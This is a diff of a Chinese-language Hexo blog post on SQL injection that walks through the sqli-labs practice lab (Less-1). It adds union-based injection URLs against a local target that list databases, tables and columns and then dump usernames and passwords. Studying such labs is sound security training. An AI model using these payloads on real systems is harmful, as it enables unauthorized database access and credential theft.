@@ -15,7 +15,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="常用的系统函数1.version() –mysql版本2.user() –数据库用户名3.database() – 数据库名4.@@datadir –数据库路径5.@@version_compile_os –操作系统版本字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据  ##sqli-labs-master## ###Less1##">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-20T09:39:56.908Z">
+<meta property="og:updated_time" content="2019-08-07T11:36:34.361Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入">
 <meta name="twitter:description" content="常用的系统函数1.version() –mysql版本2.user() –数据库用户名3.database() – 数据库名4.@@datadir –数据库路径5.@@version_compile_os –操作系统版本字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据  ##sqli-labs-master## ###Less1##">
@@ -181,7 +181,12 @@
         <p>常用的系统函数<br>1.version() –mysql版本<br>2.user() –数据库用户名<br>3.database() – 数据库名<br>4.@@datadir –数据库路径<br>5.@@version_compile_os –操作系统版本<br>字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</p>
 <hr>
 <p>##sqli-labs-master##</p>
-<p>###Less1###<br>爆所有的数据库名  127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata%23<br>爆表名 </p>
+<p>###Less1###<br>爆所有的数据库名  127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata%23</p>
+<p>库名：information_schema,�����ݿ�,challenges,dedecmsv57utf8sp2,dvwa,mysql,performance_schema,security,test,wordpress</p>
+<p>爆表名  127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+<br>表名：emails,referers,uagents,users</p>
+<p>爆列名：127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+</p>
+<p>爆数据 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,username,password from users where id=2–+</p>
+<p>###Less2</p>
 
       
 
